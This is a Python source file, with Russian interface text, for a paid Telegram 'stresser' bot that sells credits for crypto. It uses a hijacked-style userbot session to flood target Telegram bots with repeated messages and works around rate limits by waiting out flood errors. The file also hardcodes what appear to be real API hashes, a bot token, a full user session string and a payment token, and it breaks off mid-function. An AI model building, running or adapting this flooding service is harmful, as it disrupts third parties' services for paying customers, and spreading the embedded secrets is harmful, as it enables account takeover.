import asyncio
import logging
import sqlite3
import hashlib
import random
import string
import aiohttp
import json
import re
from datetime import datetime, timedelta
from typing import Dict, List, Optional

from telethon import TelegramClient, events, Button
from telethon.sessions import StringSession
from telethon.errors import FloodWaitError, ChatAdminRequiredError

# ==================== ТВОИ ДАННЫЕ ====================
API_ID = 34000428
API_HASH = '68c4db995c26cda0187e723168cc6285'
BOT_TOKEN = '8508366803:AAFTHrWsLsj9ViUy5PNp3PHiiVQnQKTwzx4'
STRESSER_SESSION_STRING = """1AgAOMTQ5LjE1NC4xNjcuNDEBuxDpjE0VYduD7dvnG+U+Q5vtLX+EtGO7tgAe+CG0ryX1xIuvUA9MbUt7v9anxRwC5vCi5j7oZ6Fs6BDkuhYyfGWwwt8sC8kNHkyEXkpv8kgZjMMoXnV1hV+Otnk0zE5YSUxHBeQDZekUfQtr9deCW5NI6XiLIyadCzltoLOFM5BKd+MggXARh4Hafy3Pdv84Rqtu5PYnBSc9JxK0Srd3gsZ3FIXfBavSYmRpXYil1S/bhfcmSAQpFg756fobQTdnPRSnsA/ov0GHHcpjH+pDpdDqlDU9HwJxerhjALksGdAvScIr2GL1+bZMRBqVO9Rj4EIKyn797NVfrFV9pQJIFjw="""

ADMIN_ID = 5522585352
CHANNEL_USERNAME = '@streeserinfo'
SUPPORT_USERNAME = '@wakeGuarantee'
REQUEST_PRICE = 0.1
REQUEST_DURATION = 15
FREE_REQUESTS_ON_START = 3

# Crypto Pay
CRYPTO_PAY_TOKEN = '482874:AAuE5RiV2VKd55z0uQzPy18MMKsRvfu8DI2'

# ==================== БАЗА ДАННЫХ ====================
class Database:
    def __init__(self, db_name='wake_stresser.db'):
        self.conn = sqlite3.connect(db_name, check_same_thread=False)
        self.cursor = self.conn.cursor()
        self.init_db()
    
    def init_db(self):
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS users (
                user_id INTEGER PRIMARY KEY,
                username TEXT,
                captcha_passed INTEGER DEFAULT 0,
                captcha_answer TEXT,
                subscribed INTEGER DEFAULT 0,
                bio_checked INTEGER DEFAULT 0,
                requests_balance INTEGER DEFAULT 0,
                total_spent REAL DEFAULT 0,
                requests_used INTEGER DEFAULT 0,
                registration_date TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                free_requests_given INTEGER DEFAULT 0
            )
        ''')
        
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS crypto_payments (
                invoice_id TEXT PRIMARY KEY,
                user_id INTEGER,
                amount_usd REAL,
                amount_crypto REAL,
                asset TEXT DEFAULT 'USDT',
                status TEXT DEFAULT 'pending',
                pay_url TEXT,
                crypto_invoice_id TEXT,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP,
                paid_at TIMESTAMP
            )
        ''')
        
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS promo_codes (
                code TEXT PRIMARY KEY,
                requests INTEGER,
                max_uses INTEGER,
                used_count INTEGER DEFAULT 0,
                created_by INTEGER,
                created_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS promo_used (
                id INTEGER PRIMARY KEY AUTOINCREMENT,
                user_id INTEGER,
                promo_code TEXT,
                used_at TIMESTAMP DEFAULT CURRENT_TIMESTAMP
            )
        ''')
        
        self.cursor.execute('''
            CREATE TABLE IF NOT EXISTS attacks (
                attack_id TEXT PRIMARY KEY,
                user_id INTEGER,
                target TEXT,
                requests_used INTEGER,
                status TEXT,
                start_time TIMESTAMP,
                end_time TIMESTAMP
            )
        ''')
        
        self.conn.commit()
    
    def get_user(self, user_id: int):
        self.cursor.execute('SELECT * FROM users WHERE user_id = ?', (user_id,))
        row = self.cursor.fetchone()
        if row:
            cols = [desc[0] for desc in self.cursor.description]
            return dict(zip(cols, row))
        return None
    
    def create_user(self, user_id: int, username: str):
        self.cursor.execute(
            'INSERT OR IGNORE INTO users (user_id, username) VALUES (?, ?)',
            (user_id, username)
        )
        self.conn.commit()
        return self.get_user(user_id)
    
    def update_user(self, user_id: int, **kwargs):
        if not kwargs:
            return
        
        set_clause = ', '.join([f'{k}=?' for k in kwargs.keys()])
        values = list(kwargs.values()) + [user_id]
        self.cursor.execute(f'UPDATE users SET {set_clause} WHERE user_id=?', values)
        self.conn.commit()
    
    def add_requests(self, user_id: int, requests: int):
        self.cursor.execute(
            'UPDATE users SET requests_balance = requests_balance + ? WHERE user_id = ?',
            (requests, user_id)
        )
        self.conn.commit()
        return True
    
    def use_requests(self, user_id: int, requests: int):
        user = self.get_user(user_id)
        if not user or user['requests_balance'] < requests:
            return False
        
        self.cursor.execute(
            '''UPDATE users SET 
               requests_balance = requests_balance - ?,
               requests_used = requests_used + ?
               WHERE user_id = ?''',
            (requests, requests, user_id)
        )
        self.conn.commit()
        return True
    
    def give_free_requests(self, user_id: int):
        user = self.get_user(user_id)
        if user and user['free_requests_given'] == 0:
            self.cursor.execute(
                '''UPDATE users SET 
                   requests_balance = requests_balance + ?,
                   free_requests_given = 1
                   WHERE user_id = ?''',
                (FREE_REQUESTS_ON_START, user_id)
            )
            self.conn.commit()
            return FREE_REQUESTS_ON_START
        return 0
    
    def create_crypto_payment(self, invoice_id: str, user_id: int, amount_usd: float, 
                            amount_crypto: float, asset: str, pay_url: str, crypto_invoice_id: str):
        self.cursor.execute(
            '''INSERT INTO crypto_payments 
               (invoice_id, user_id, amount_usd, amount_crypto, asset, pay_url, crypto_invoice_id)
               VALUES (?, ?, ?, ?, ?, ?, ?)''',
            (invoice_id, user_id, amount_usd, amount_crypto, asset, pay_url, crypto_invoice_id)
        )
        self.conn.commit()
        return True
    
    def get_crypto_payment(self, invoice_id: str):
        self.cursor.execute('SELECT * FROM crypto_payments WHERE invoice_id = ?', (invoice_id,))
        row = self.cursor.fetchone()
        if row:
            cols = [desc[0] for desc in self.cursor.description]
            return dict(zip(cols, row))
        return None
    
    def get_crypto_payment_by_crypto_id(self, crypto_invoice_id: str):
        self.cursor.execute('SELECT * FROM crypto_payments WHERE crypto_invoice_id = ?', (crypto_invoice_id,))
        row = self.cursor.fetchone()
        if row:
            cols = [desc[0] for desc in self.cursor.description]
            return dict(zip(cols, row))
        return None
    
    def mark_crypto_payment_paid(self, crypto_invoice_id: str):
        payment = self.get_crypto_payment_by_crypto_id(crypto_invoice_id)
        if not payment:
            return False
        
        self.cursor.execute(
            'UPDATE crypto_payments SET status = "paid", paid_at = ? WHERE crypto_invoice_id = ?',
            (datetime.now(), crypto_invoice_id)
        )
        
        user_id = payment['user_id']
        amount_usd = payment['amount_usd']
        requests = int(amount_usd / REQUEST_PRICE)
        
        self.add_requests(user_id, requests)
        self.cursor.execute(
            'UPDATE users SET total_spent = total_spent + ? WHERE user_id = ?',
            (amount_usd, user_id)
        )
        
        self.conn.commit()
        return True
    
    def create_promo_code(self, code: str, requests: int, max_uses: int, created_by: int):
        try:
            self.cursor.execute(
                'INSERT INTO promo_codes (code, requests, max_uses, created_by) VALUES (?, ?, ?, ?)',
                (code.upper(), requests, max_uses, created_by)
            )
            self.conn.commit()
            return True
        except:
            return False
    
    def get_promo_code(self, code: str):
        self.cursor.execute('SELECT * FROM promo_codes WHERE code = ?', (code.upper(),))
        row = self.cursor.fetchone()
        if row:
            cols = [desc[0] for desc in self.cursor.description]
            return dict(zip(cols, row))
        return None
    
    def use_promo_code(self, user_id: int, code: str):
        promo = self.get_promo_code(code)
        if not promo:
            return None
        
        if promo['used_count'] >= promo['max_uses']:
            return None
        
        self.cursor.execute(
            'SELECT id FROM promo_used WHERE user_id = ? AND promo_code = ?',
            (user_id, code.upper())
        )
        if self.cursor.fetchone():
            return None
        
        self.cursor.execute(
            'UPDATE promo_codes SET used_count = used_count + 1 WHERE code = ?',
            (code.upper(),)
        )
        
        self.cursor.execute(
            'INSERT INTO promo_used (user_id, promo_code) VALUES (?, ?)',
            (user_id, code.upper())
        )
        
        self.conn.commit()
        return promo['requests']
    
    def get_all_promo_codes(self):
        self.cursor.execute('SELECT * FROM promo_codes ORDER BY created_at DESC')
        rows = self.cursor.fetchall()
        cols = [desc[0] for desc in self.cursor.description]
        return [dict(zip(cols, row)) for row in rows]
    
    def create_attack(self, attack_id: str, user_id: int, target: str, requests_used: int):
        self.cursor.execute(
            '''INSERT INTO attacks 
               (attack_id, user_id, target, requests_used, status, start_time)
               VALUES (?, ?, ?, ?, ?, ?)''',
            (attack_id, user_id, target, requests_used, 'running', datetime.now())
        )
        self.conn.commit()
        return True
    
    def update_attack(self, attack_id: str, status: str):
        self.cursor.execute(
            'UPDATE attacks SET status = ?, end_time = ? WHERE attack_id = ?',
            (status, datetime.now(), attack_id)
        )
        self.conn.commit()
        return True
    
    def get_stats(self):
        stats = {}
        
        queries = [
            ('total_users', 'SELECT COUNT(*) FROM users'),
            ('active_users', 'SELECT COUNT(*) FROM users WHERE requests_balance > 0'),
            ('total_requests', 'SELECT SUM(requests_balance) FROM users'),
            ('total_used', 'SELECT SUM(requests_used) FROM users'),
            ('total_income', 'SELECT SUM(amount_usd) FROM crypto_payments WHERE status = "paid"'),
            ('total_attacks', 'SELECT COUNT(*) FROM attacks'),
            ('free_requests_given', 'SELECT COUNT(*) FROM users WHERE free_requests_given = 1'),
        ]
        
        for key, query in queries:
            self.cursor.execute(query)
            result = self.cursor.fetchone()[0]
            stats[key] = result if result is not None else 0
        
        return stats
    
    def get_all_users(self, limit: int = 50):
        self.cursor.execute(
            'SELECT * FROM users ORDER BY registration_date DESC LIMIT ?',
            (limit,)
        )
        rows = self.cursor.fetchall()
        cols = [desc[0] for desc in self.cursor.description]
        return [dict(zip(cols, row)) for row in rows]
    
    def get_pending_payments(self):
        self.cursor.execute("SELECT * FROM crypto_payments WHERE status = 'pending' ORDER BY created_at DESC")
        rows = self.cursor.fetchall()
        cols = [desc[0] for desc in self.cursor.description]
        return [dict(zip(cols, row)) for row in rows]
    
    def close(self):
        self.conn.close()

# ==================== CRYPTO PAY API ====================
class CryptoPayAPI:
    def __init__(self, token: str):
        self.token = token
        self.base_url = 'https://pay.crypt.bot/api'
        self.session = None
    
    async def create_invoice(self, asset: str, amount: float, description: str = ''):
        if not self.session:
            self.session = aiohttp.ClientSession()
        
        headers = {
            'Crypto-Pay-API-Token': self.token,
            'Content-Type': 'application/json'
        }
        
        data = {
            'asset': asset,
            'amount': str(amount),
            'description': description,
            'hidden_message': 'Оплата Wake Stresser Bot',
            'paid_btn_name': 'view_bot',
            'paid_btn_url': 'https://t.me/WakeStresserBot'
        }
        
        try:
            async with self.session.post(
                f'{self.base_url}/createInvoice',
                headers=headers,
                json=data
            ) as response:
                result = await response.json()
                if result.get('ok'):
                    return result['result']
                else:
                    logging.error(f"Crypto Pay Error: {result}")
                    return None
        except Exception as e:
            logging.error(f"Crypto Pay API error: {e}")
            return None
    
    async def get_invoices(self, invoice_ids: List[str] = None):
        if not self.session:
            self.session = aiohttp.ClientSession()
        
        headers = {
            'Crypto-Pay-API-Token': self.token,
            'Content-Type': 'application/json'
        }
        
        data = {}
        if invoice_ids:
            data['invoice_ids'] = ','.join(invoice_ids)
        
        try:
            async with self.session.post(
                f'{self.base_url}/getInvoices',
                headers=headers,
                json=data
            ) as response:
                result = await response.json()
                if result.get('ok'):
                    return result['result']['items']
                else:
                    return None
        except Exception as e:
            logging.error(f"Crypto Pay get invoices error: {e}")
            return None
    
    async def close(self):
        if self.session:
            await self.session.close()

# ==================== КАПТЧА ====================
class CaptchaSystem:
    @staticmethod
    def generate():
        a = random.randint(1, 20)
        b = random.randint(1, 20)
        answer = a + b
        question = f"{a} + {b} = ?"
        return question, str(answer)

# ==================== БИО ПРОВЕРКА ====================
class BioChecker:
    def __init__(self, client):
        self.client = client
    
    async def check_bio(self, user_id: int) -> bool:
        """Проверяет наличие юзернейма бота в bio пользователя"""
        try:
            # Получаем пользователя
            user_entity = await self.client.get_entity(user_id)
            
            # Проверяем bio (описание профиля)
            if hasattr(user_entity, 'about') and user_entity.about:
                bio_text = user_entity.about.lower()
                
                # Ищем юзернейм бота в bio
                required_username = "wakestresserbot"
                if required_username in bio_text or f'@{required_username}' in bio_text:
                    return True
            
            return False
        except Exception as e:
            logging.error(f"Ошибка проверки bio для пользователя {user_id}: {e}")
            return False

# ==================== ПРОВЕРКА ПОДПИСКИ ====================
class SubscriptionChecker:
    def __init__(self, client):
        self.client = client
    
    async def check_subscription(self, user_id: int) -> bool:
        """Проверяет подписку на канал"""
        try:
            channel = await self.client.get_entity(CHANNEL_USERNAME)
            
            try:
                # Пробуем получить информацию о участнике
                participant = await self.client.get_participant(channel, user_id)
                
                # Проверяем статус участника
                if hasattr(participant, 'status'):
                    status = str(participant.status).lower()
                    if status in ['member', 'administrator', 'creator', 'participant']:
                        return True
                
                return False
                
            except (ValueError, ChatAdminRequiredError) as e:
                # Если нет прав на проверку, считаем что подписан
                logging.warning(f"Не удалось проверить подписку для {user_id}: {e}")
                return True
                
        except Exception as e:
            logging.error(f"Ошибка проверки подписки: {e}")
            return False

# ==================== СТРЕССЕР ====================
class BotStresser:
    def __init__(self, client):
        self.client = client
        self.active_attacks = {}
    
    async def stress_bot(self, bot_username: str, requests_count: int):
        try:
            if any(x in bot_username.lower() for x in ['wake', 'stress', 'stresser']):
                return {'success': False, 'error': 'Нельзя атаковать своих ботов'}
            
            attack_id = f"ATK{random.randint(100000, 999999)}"
            
            self.active_attacks[attack_id] = {
                'target': bot_username,
                'requests': requests_count,
                'started': datetime.now(),
                'sent': 0,
                'status': 'running'
            }
            
            asyncio.create_task(self._execute_attack(attack_id, bot_username, requests_count))
            
            return {
                'success': True,
                'attack_id': attack_id,
                'duration': requests_count * REQUEST_DURATION
            }
            
        except Exception as e:
            return {'success': False, 'error': str(e)}
    
    async def _execute_attack(self, attack_id: str, bot_username: str, requests: int):
        attack = self.active_attacks.get(attack_id)
        if not attack:
            return
        
        try:
            bot = await self.client.get_entity(bot_username)
        except:
            attack['status'] = 'failed'
            return
        
        for i in range(requests):
            if attack['status'] != 'running':
                break
            
            try:
                messages = ['/start', 'test', 'ping', 'hello', 'бот']
                await self.client.send_message(bot, random.choice(messages))
                attack['sent'] += 1
                await asyncio.sleep(random.uniform(0.3, 0.8))
            except FloodWaitError as e:
                await asyncio.sleep(e.seconds)
            except:
                await asyncio.sleep(1)
        
        attack['status'] = 'completed'

# ==================== ОСНОВНОЙ БОТ ====================
class WakeStresserBot:
    def __init__(self):
        self.db = Database()
        self.captcha = CaptchaSystem()
        self.crypto_api = CryptoPayAPI(CRYPTO_PAY_TOKEN)
        self.bot_client = None
        self.userbot_client = None
        self.stresser = None
        self.bio_checker = None
        self.sub_checker = None
    
    async def initialize(self):
        """Инициализация клиентов"""
        try:
            self.bot_client = TelegramClient('bot_session', API_ID, API_HASH)
            await self.bot_client.start(bot_token=BOT_TOKEN)
            bot_me = await self.bot_client.get_me()
            logging.info(f"✅ Бот запущен: @{bot_me.username}")
        except Exception as e:
            logging.error(f"❌ Ошибка запуска бота: {e}")
            return False
        
        try:
            self.userbot_client = TelegramClient(
                StringSession(STRESSER_SESSION_STRING),
                API_ID,
                API_HASH
            )
            await self.userbot_client.start()
            userbot_me = await self.userbot_client.get_me()
            logging.info(f"✅ Юзербот запущен: @{userbot_me.username}")
        except Exception as e:
            logging.error(f"❌ Ошибка запуска юзербота: {e}")
            return False
        
        self.stresser = BotStresser(self.userbot_client)
        self.bio_checker = BioChecker(self.userbot_client)
        self.sub_checker = SubscriptionChecker(self.userbot_client)
        await self._register_handlers()
        
        # Проверка подписки на канал при старте
        try:
            channel = await self.bot_client.get_entity(CHANNEL_USERNAME)
            logging.info(f"✅ Канал найден: {CHANNEL_USERNAME}")
        except Exception as e:
            logging.warning(f"⚠️ Канал {CHANNEL_USERNAME} не найден: {e}")
        
        logging.info("✅ Бот полностью инициализирован")
        return True
    
    async def _register_handlers(self):
        """Регистрация обработчиков событий"""
        
        # ========== START HANDLER ==========
        @self.bot_client.on(events.NewMessage(pattern='/start'))
        async def start_handler(event):
            user_id = event.sender_id
            username = event.sender.username or ''
            
            user = self.db.get_user(user_id)
            if not user:
                user = self.db.create_user(user_id, username)
            
            # Проверка капчи
            if not user['captcha_passed']:
                question, answer = self.captcha.generate()
                self.db.update_user(user_id, captcha_answer=answer)
                
                await event.respond(
                    f"🔐 **Проверка безопасности**\n\nРешите пример: {question}\nОтправьте ответ числом в чат.",
                    buttons=Button.clear()
                )
                return
            
            # Проверка подписки
            if not user['subscribed']:
                await event.respond(
                    f"📢 **Добро пожаловать!**\n\n"
                    f"Для использования бота необходимо:\n\n"
                    f"1️⃣ **Подписаться на канал:**\n"
                    f"{CHANNEL_USERNAME}\n\n"
                    f"2️⃣ **Добавить в bio (описание профиля):**\n"
                    f"@WakeStresserBot\n\n"
                    f"**После выполнения:**",
                    buttons=[
                        [Button.url("📢 Подписаться на канал", f"https://t.me/{CHANNEL_USERNAME.replace('@', '')}")],
                        [Button.inline("✅ Проверить подписку и bio", b"check_sub_bio")]
                    ]
                )
                return
            
            # Проверка bio
            if not user['bio_checked']:
                await self._check_bio_and_proceed(event, user_id)
                return
            
            # Выдаем бесплатные запросы если еще не выдавались
            free_requests = self.db.give_free_requests(user_id)
            if free_requests > 0:
                await event.respond(
                    f"🎁 **БОНУС ПРИВЕТСТВИЯ!**\n\n"
                    f"Вам начислено {FREE_REQUESTS_ON_START} бесплатных запросов!\n"
                    f"Используйте их для тестирования бота 🚀"
                )
            
            await self._show_main_menu(event)
        
        # ========== TEXT MESSAGE HANDLER ==========
        @self.bot_client.on(events.NewMessage(func=lambda e: not e.message.text.startswith('/')))
        async def text_message_handler(event):
            user_id = event.sender_id
            text = event.message.text.strip()
            
            user = self.db.get_user(user_id)
            if not user:
                return
            
            # ПРОВЕРКА КАПЧИ
            if not user['captcha_passed']:
                correct_answer = user.get('captcha_answer', '')
                if text == correct_answer:
                    self.db.update_user(user_id, captcha_passed=True)
                    await event.respond("✅ Капча пройдена успешно!")
                    
                    await event.respond(
                        f"📢 **Добро пожаловать!**\n\n"
                        f"Для использования бота необходимо:\n\n"
                        f"1️⃣ **Подписаться на канал:**\n"
                        f"{CHANNEL_USERNAME}\n\n"
                        f"2️⃣ **Добавить в bio (описание профиля):**\n"
                        f"@WakeStresserBot\n\n"
                        f"**После выполнения:**",
                        buttons=[
                            [Button.url("📢 Подписаться на канал", f"https://t.me/{CHANNEL_USERNAME.replace('@', '')}")],
                            [Button.inline("✅ Проверить подписку и bio", b"check_sub_bio")]
                        ]
                    )
                else:
                    question, answer = self.captcha.generate()
                    self.db.update_user(user_id, captcha_answer=answer)
                    await event.respond(f"❌ Неверный ответ!\n\nНовый пример: {question}\nОтправьте ответ числом:")
                return
            
            # ОБРАБОТКА КОМАНД STRESS
            if text.startswith('@') and ' ' in text:
                await self._handle_stress_command(event, text)
            
            # ОБРАБОТКА ПРОМОКОДОВ
            elif text.upper().startswith('PROMO '):
                await self._handle_promo_command(event, text)
            
            # ОБРАБОТКА АДМИН КОМАНД
            elif user_id == ADMIN_ID:
                await self._handle_admin_command(event, text)
        
        # ========== CALLBACK HANDLERS ==========
        @self.bot_client.on(events.CallbackQuery)
        async def callback_handler(event):
            data = event.data.decode()
            
            if data == 'check_sub_bio':
                await self._check_subscription_and_bio(event)
            
            elif data == 'main_menu':
                await self._show_main_menu(event)
            
            elif data == 'buy_requests':
                await self._show_buy_menu(event)
            
            elif data.startswith('buy_'):
                try:
                    requests = int(data.split('_')[1])
                    await self._process_crypto_payment(event, requests)
                except:
                    await event.answer("❌ Ошибка!", alert=True)
            
            elif data == 'stress_menu':
                await self._show_stress_menu(event)
            
            elif data == 'my_stats':
                await self._show_stats(event)
            
            elif data == 'help':
                await event.respond(
                    f"🆘 **Помощь**\n\nПо вопросам:\n{SUPPORT_USERNAME}",
                    buttons=Button.clear()
                )
            
            elif data == 'activate_promo':
                await event.respond(
                    "🎁 **Активация промокода**\n\nОтправьте промокод в чат:\n`PROMO код`\n\nПример: `PROMO WELCOME100`"
                )
            
            # АДМИН ПАНЕЛЬ
            elif data == 'admin_panel':
                if event.sender_id == ADMIN_ID:
                    await self._show_admin_panel(event)
                else:
                    await event.answer("❌ Доступ запрещён!", alert=True)
            
            elif data == 'admin_stats':
                if event.sender_id == ADMIN_ID:
                    await self._show_admin_stats(event)
                else:
                    await event.answer("❌ Доступ запрещён!", alert=True)
            
            elif data == 'admin_users':
                if event.sender_id == ADMIN_ID:
                    await self._show_admin_users(event)
                else:
                    await event.answer("❌ Доступ запрещён!", alert=True)
            
            elif data == 'admin_promo':
                if event.sender_id == ADMIN_ID:
                    await self._show_admin_promo_panel(event)
                else:
                    await event.answer("❌ Доступ запрещён!", alert=True)
            
            elif data == 'admin_broadcast':
                if event.sender_id == ADMIN_ID:
                    await self._start_broadcast(event)
                else:
                    await event.answer("❌ Доступ запрещён!", alert=True)
            
            elif data == 'admin_payments':
                if event.sender_id == ADMIN_ID:
                    await self._show_admin_payments(event)
                else:
                    await event.answer("❌ Доступ запрещён!", alert=True)
            
            elif data.startswith('check_pay_'):
                invoice_id = data.split('_')[2]
                await self._check_payment_status(event, invoice_id)
            
            elif data.startswith('approve_pay_'):
                if event.sender_id == ADMIN_ID:
                    payment_id = data.split('_')[2]
                    await self._approve_payment(event, payment_id)
                else:
                    await event.answer("❌ Доступ запрещён!", alert=True)
            
            elif data == 'check_bio_again':
                await self._check_bio_and_proceed(event, event.sender_id)
    
    # ========== ПРОВЕРКА ПОДПИСКИ И BIO ==========
    async def _check_subscription_and_bio(self, event):
        user_id = event.sender_id
        
        try:
            # Проверяем подписку на канал
            subscribed = await self.sub_checker.check_subscription(user_id)
            
            if not subscribed:
                await event.edit(
                    f"❌ **Вы не подписаны на канал!**\n\n"
                    f"Подпишитесь на канал:\n{CHANNEL_USERNAME}\n\n"
                    f"После подписки нажмите кнопку проверки снова:",
                    buttons=[
                        [Button.url("📢 Подписаться", f"https://t.me/{CHANNEL_USERNAME.replace('@', '')}")],
                        [Button.inline("🔄 Проверить снова", b"check_sub_bio")]
                    ]
                )
                return
            
            # Проверяем bio
            bio_valid = await self.bio_checker.check_bio(user_id)
            
            if not bio_valid:
                await event.edit(
                    "❌ **Не найдено нужное описание в профиле!**\n\n"
                    "📝 **Вам нужно добавить в bio (описание профиля):**\n"
                    "```\n@WakeStresserBot\n```\n"
                    "**Как добавить:**\n"
                    "1. Откройте настройки Telegram\n"
                    "2. Измените описание профиля (Bio)\n"
                    "3. Добавьте текст `@WakeStresserBot`\n"
                    "4. Сохраните изменения\n\n"
                    "После добавления нажмите кнопку проверки:",
                    buttons=[
                        [Button.inline("🔄 Проверить bio", b"check_bio_again")],
                        [Button.url("ℹ️ Как изменить bio?", "https://telegra.ph/Kak-dobavit-bio-v-Telegram-01-18")]
                    ]
                )
                return
            
            # Все проверки пройдены
            self.db.update_user(user_id, subscribed=True, bio_checked=True)
            
            # Даем бесплатные запросы
            free_requests = self.db.give_free_requests(user_id)
            
            if free_requests > 0:
                await event.edit(
                    f"✅ **Все проверки пройдены!**\n\n"
                    f"🎁 **Бонус за регистрацию:**\n"
                    f"Вам начислено {FREE_REQUESTS_ON_START} бесплатных запросов!\n\n"
                    f"🚀 Теперь вы можете пользоваться ботом!",
                    buttons=[[Button.inline("🚀 Начать", b"main_menu")]]
                )
            else:
                await event.edit(
                    "✅ **Все проверки пройдены!**\n\n"
                    "🚀 Теперь вы можете пользоваться ботом!",
                    buttons=[[Button.inline("🚀 Начать", b"main_menu")]]
                )
                
        except Exception as e:
            logging.error(f"Ошибка проверки подписки/bio: {e}")
            await event.answer("❌ Ошибка проверки. Попробуйте позже.", alert=True)
    
    async def _check_bio_and_proceed(self, event, user_id: int):
        """Проверяет только bio (после прохождения подписки)"""
        bio_valid = await self.bio_checker.check_bio(user_id)
        
        if not bio_valid:
            await event.respond(
                "❌ **Не найдено нужное описание в профиле!**\n\n"
                "📝 **Вам нужно добавить в bio (описание профиля):**\n"
                "```\n@WakeStresserBot\n```\n"
                "**Как добавить:**\n"
                "1. Откройте настройки Telegram\n"
                "2. Измените описание профиля (Bio)\n"
                "3. Добавьте текст `@WakeStresserBot`\n"
                "4. Сохраните изменения\n\n"
                "После добавления нажмите кнопку:",
                buttons=[[Button.inline("🔄 Проверить bio", b"check_bio_again")]]
            )
            return
        
        # Bio проверено успешно
        self.db.update_user(user_id, bio_checked=True)
        
        # Даем бесплатные запросы если еще не выдавались
        free_requests = self.db.give_free_requests(user_id)
        
        if free_requests > 0:
            await event.respond(
                f"✅ **Bio проверено успешно!**\n\n"
                f"🎁 **Бонус приветствия:**\n"
                f"Вам начислено {FREE_REQUESTS_ON_START} бесплатных запросов!\n\n"
                f"🚀 Теперь вы можете пользоваться ботом!",
                buttons=[[Button.inline("🚀 Начать", b"main_menu")]]
            )
        else:
            await event.respond(
                "✅ **Bio проверено успешно!**\n\n"
                "🚀 Теперь вы можете пользоваться ботом!",
                buttons=[[Button.inline("🚀 Начать", b"main_menu")]]
            )
    
    # ========== ПОЛЬЗОВАТЕЛЬСКИЕ МЕНЮ ==========
    async def _show_main_menu(self, event):
        user = self.db.get_user(event.sender_id)
        balance = user['requests_balance'] if user else 0
        
        buttons = [
            [Button.inline("🛒 Купить запросы", b"buy_requests")],
            [Button.inline("⚡ Запустить Stress", b"stress_menu")],
            [Button.inline("🎁 Активировать промокод", b"activate_promo")],
            [Button.inline("📊 Моя статистика", b"my_stats"),
             Button.inline("🆘 Помощь", b"help")]
        ]
        
        if event.sender_id == ADMIN_ID:
            buttons.append([Button.inline("👑 Админ панель", b"admin_panel")])
        
        await event.respond(
            f"🔥 **Wake Stresser Bot**\n\n"
            f"📊 Ваш баланс: `{balance}` запросов\n"
            f"💰 1 запрос = ${REQUEST_PRICE}\n"
            f"⏱️ 1 запрос = {REQUEST_DURATION} секунд\n\n"
            f"🎁 **Бесплатно:** {FREE_REQUESTS_ON_START} запросов при регистрации!\n\n"
            f"💳 **Оплата через Crypto Pay**\n"
            f"Поддерживаются: USDT, TON\n\n"
            f"Выберите действие:",
            buttons=buttons
        )
    
    async def _show_buy_menu(self, event):
        await event.edit(
            "🛒 **Покупка запросов**\n\n"
            f"1 запрос = ${REQUEST_PRICE} = {REQUEST_DURATION} секунд\n"
            f"💳 Оплата через @CryptoBot\n"
            f"🎁 При регистрации: {FREE_REQUESTS_ON_START} бесплатных запросов!\n\n"
            "Выберите количество запросов:",
            buttons=[
                [Button.inline("🔟 10 запросов ($1)", b"buy_10"),
                 Button.inline("💯 100 запросов ($10)", b"buy_100")],
                [Button.inline("🔥 500 запросов ($50)", b"buy_500"),
                 Button.inline("💥 1000 запросов ($100)", b"buy_1000")],
                [Button.inline("🔙 Назад", b"main_menu")]
            ]
        )
    
    async def _process_crypto_payment(self, event, requests):
        user_id = event.sender_id
        amount_usd = requests * REQUEST_PRICE
        
        await event.edit("⏳ Создаю платёжную ссылку...")
        
        try:
            asset = 'USDT'
            amount_crypto = amount_usd
            
            invoice_data = await self.crypto_api.create_invoice(
                asset=asset,
                amount=amount_crypto,
                description=f"Оплата {requests} запросов"
            )
            
            if not invoice_data:
                await event.edit("❌ Ошибка создания платежа. Попробуйте позже.")
                return
            
            invoice_id = f"CRYPTO_{random.randint(100000, 999999)}"
            crypto_invoice_id = invoice_data.get('invoice_id')
            pay_url = invoice_data.get('pay_url') or invoice_data.get('bot_invoice_url')
            
            self.db.create_crypto_payment(
                invoice_id, user_id, amount_usd, amount_crypto, 
                asset, pay_url, crypto_invoice_id
            )
            
            message = (
                f"💳 **Оплата {requests} запросов**\n\n"
                f"📊 Запросов: {requests}\n"
                f"💰 Сумма: ${amount_usd:.2f}\n"
                f"💎 К оплате: {amount_crypto} {asset}\n"
                f"⏱️ Длительность: {requests * REQUEST_DURATION} сек\n\n"
                f"**Ссылка для оплаты:**\n"
            )
            
            buttons = []
            
            if pay_url:
                buttons.append([Button.url("🔗 Оплатить по ссылке", pay_url)])
            
            message += f"🤖 **Или оплатите через @CryptoBot**\n\n"
            message += f"🆔 ID платежа: `{invoice_id}`\n"
            message += f"📌 После оплаты нажмите '✅ Проверить оплату'"
            
            buttons.append([Button.inline("✅ Проверить оплату", f"check_pay_{invoice_id}")])
            buttons.append([Button.inline("❌ Отмена", b"buy_requests")])
            
            await event.edit(message, buttons=buttons)
            
        except Exception as e:
            logging.error(f"Payment error: {e}")
            await event.edit(f"❌ Ошибка: {str(e)}")
    
    async def _check_payment_status(self, event, invoice_id):
        payment = self.db.get_crypto_payment(invoice_id)
        
        if not payment:
            await event.answer("❌ Платёж не найден!", alert=True)
            return
        
        if payment['status'] == 'paid':
            requests = int(payment['amount_usd'] / REQUEST_PRICE)
            await event.edit(
                f"✅ **Оплата подтверждена!**\n\n"
                f"💰 Сумма: ${payment['amount_usd']:.2f}\n"
                f"🎁 Зачислено: {requests} запросов\n\n"
                f"Теперь можете запускать атаки!",
                buttons=[[Button.inline("⚡ Запустить Stress", b"stress_menu")]]
            )
        else:
            invoices = await self.crypto_api.get_invoices([payment['crypto_invoice_id']])
            
            if invoices and len(invoices) > 0:
                invoice_status = invoices[0].get('status', '')
                
                if invoice_status == 'paid':
                    self.db.mark_crypto_payment_paid(payment['crypto_invoice_id'])
                    requests = int(payment['amount_usd'] / REQUEST_PRICE)
                    
                    await event.edit(
                        f"✅ **Оплата подтверждена!**\n\n"
                        f"💰 Сумма: ${payment['amount_usd']:.2f}\n"
                        f"🎁 Зачислено: {requests} запросов\n\n"
                        f"Теперь можете запускать атаки!",
                        buttons=[[Button.inline("⚡ Запустить Stress", b"stress_menu")]]
                    )
                else:
                    await event.answer(f"⏳ Статус: {invoice_status}. Попробуйте позже.", alert=True)
            else:
